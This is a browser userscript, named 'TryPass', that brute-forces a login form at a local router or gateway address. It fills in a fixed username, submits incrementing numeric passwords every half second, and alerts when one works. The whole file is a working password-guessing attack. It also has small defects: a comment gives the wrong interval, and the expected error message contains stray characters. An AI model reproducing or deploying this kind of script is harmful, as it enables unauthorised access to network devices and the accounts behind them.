// ==UserScript==
// @name        TryPass
// @namespace   PasswordTrials
// @description just loops
// @include     *192.168.1.1:8090*
// @version     1
// @grant       none
// ==/UserScript==
//variable containing the  success note and incorrect password note
var noteSuccessLogIn = 'You have successfully logged in';
var passIncorrect = 'The system could not log you on. Make sure your password is correctvgh';
//trial username & password
var usernameee = 'cyberoam';
var passworddd = 1000;
//initial login
document.querySelector('input[name=username]') .value = usernameee;
document.querySelector('input[name= password]') .value = passworddd;
document.getElementById('logincaption') .click();
//starting the interval loop (that 2000 is miliseconds i.e. 2 seconds)
//so, you can alter the time between rechecks here
var scriptInterval = setInterval(function () {
    multipleScript()
}, 500);
//function for interval loop
function multipleScript()
{
    passworddd++;
  //  document.querySelector('input[name=username]').type = "text";
    //getting the note after login
    var noteCurrent = document.getElementById('msgDiv') .textContent;
    //main stuff happens here
    if (noteCurrent.trim() == passIncorrect)
    {
        document.querySelector('input[name=username]') .value = usernameee;
        document.querySelector('input[name= password]') .value = passworddd;
        document.getElementById('logincaption') .click();
    } 
    else if (noteCurrent.trim() == noteSuccessLogIn)
    {
        alert('password is = ' + passworddd);
    } 
    else
    {
        alert('something is wrong');
    }
    document.getElementById('usernamelbl') .textContent = passworddd;
}
